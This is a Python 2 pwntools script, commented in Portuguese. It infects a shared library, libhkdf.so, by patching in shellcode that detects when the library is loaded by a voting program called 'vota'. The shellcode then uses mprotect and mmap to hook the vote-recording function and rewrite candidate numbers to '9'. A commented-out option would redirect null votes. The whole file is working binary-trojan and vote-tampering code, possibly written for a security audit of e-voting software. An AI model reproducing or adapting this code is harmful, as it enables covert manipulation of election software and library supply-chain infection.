#!/usr/bin/python2
# -*- encoding: utf-8 -*-

import re
from pwn import *
context(arch='i386')


def load_addr(addr, data):
    code = 'mov edi, 0x%x\n' % addr
    while data != '':
        if len(data) >= 4:
            code += 'mov eax, 0x%x\nstosd\n' % u32(data[:4])
            data = data[4:]
        elif len(data) >= 2:
            code += 'mov ax, 0x%x\nstosw\n' % u16(data[:2])
            data = data[2:]
        elif len(data) == 1:
            code += 'mov al, 0x%x\nstosb\n' % u8(data[:1])
            data = data[1:]
        else:
            raise ValueError('should never be reached')
    return code


hkdf = ELF('../libhkdf.so.orig')
vota = ELF('vota')


thunk = hkdf.symbols['__x86.get_pc_thunk.ax']
inicio_hkdf = hkdf.symbols['_Z4hkdfPKhPh']
# Procura endereço da instrução seguinte à
# "call __x86.get_pc_thunk.ax" dentro
# da função _Z4hkdfPKhPh
endereco_hkdf = int('0x' +
    re.search(r'call\s+0x%x\n\s*([^:]+)' % thunk,
              disasm(hkdf.read(inicio_hkdf, 32),
                     vma=inicio_hkdf,
                     byte=False)
             ).group(1)
    , 16)

endereco_lixo = hkdf.symbols['_Z4lixov']
diferenca_lixo = endereco_lixo - endereco_hkdf


infect_hkdf_asm = (
    """
    add eax, 0x%x
    call eax
    """ % diferenca_lixo)
infect_hkdf = asm(infect_hkdf_asm)

hkdf_original_asm = disasm(hkdf.read(endereco_hkdf, len(infect_hkdf)),
                           byte=False,
                           offset=False)
hkdf_original = asm(hkdf_original_asm)

assert len(infect_hkdf) == len(hkdf_original), \
    "Tamanho do código infectado precisa bater com tamanho do trecho original substituído"

log.info("Infectando hkdf")
log.info("%s ==> %s" % (hkdf_original_asm, infect_hkdf_asm))
hkdf.write(endereco_hkdf, infect_hkdf)


vota_addr = vota.symbols['_ZN11InfoEleitor12AdicionaVotoEhiRNSt7__cxx1112basic_stringIcSt11char_traitsIcESaIcEEE']
vota_alloc = (vota.memory.end() + 4096) & (~4095)

infect_adiciona_voto_asm = (
    """
    mov edx, 0x%x
    jmp edx
    """ % vota_alloc)
while True:
    infect_adiciona_voto = asm(infect_adiciona_voto_asm)

    adiciona_voto_original_asm = disasm(vota.read(vota_addr, len(infect_adiciona_voto)),
                                        byte=False,
                                        offset=False)
    if '.byte' in adiciona_voto_original_asm:
        # instrução do código original cortada na metade
        infect_adiciona_voto_asm += "nop\n"
    else:
        break
adiciona_voto_original = asm(adiciona_voto_original_asm)

assert len(infect_adiciona_voto) == len(adiciona_voto_original), \
    "Tamanho do código infectado precisa bater com tamanho do trecho original substituído"

log.info("Infectando vota")
log.info("%s ==> %s" % (adiciona_voto_original_asm, infect_adiciona_voto_asm))


mutreta_voto_asm = (
    """
    push ebp
    mov ebp, esp
    pushad

    // descomente para redirecionar votos nulos
    // mov dword ptr [ebp+0x10], 0

    // coloca std::string& em eax
    mov eax, [ebp+0x14]

    // coloca char* em edi
    mov edi, [eax]

    // troca dois caracteres
    mov al, '9'
    stosb
    stosb

    popad
    pop ebp
    """
    + adiciona_voto_original_asm +
    """
    mov edx, 0x%x
    jmp edx
    """ % (vota_addr + len(infect_adiciona_voto)))

log.info("Montando mutreta a ser carregada em 0x%x" % vota_alloc)
log.info(mutreta_voto_asm)
mutreta_voto = asm(mutreta_voto_asm)


conteudo_esperado = u32(vota.read(vota_addr, 4))
overwrite_lixo_asm = (
    """
    pushad
    // verifica se a lib estah sendo carregada dentro do vota
    mov eax, 0x%x
    mov eax, [eax]
    cmp eax, 0x%x
    jne nao_eh_o_vota
    """ % (vota_addr, conteudo_esperado) +
    shellcraft.mprotect(vota_addr & (~4095), 2*4096, 7) +
    shellcraft.mmap(vota_alloc, 4096, 7, 0x22, 0, 0) +
    load_addr(vota_alloc, mutreta_voto) +
    load_addr(vota_addr, infect_adiciona_voto) +
    """
    nao_eh_o_vota:
    popad
    sub eax, 0x%x
    """ % diferenca_lixo +
    hkdf_original_asm +
    """
    ret
    """)
overwrite_lixo = asm(overwrite_lixo_asm)

log.info("Sobrescrevendo lixo com código para plantar a mutreta")
log.info(overwrite_lixo_asm)
hkdf.write(endereco_lixo, overwrite_lixo)

hkdf.save('../libhkdf.so')
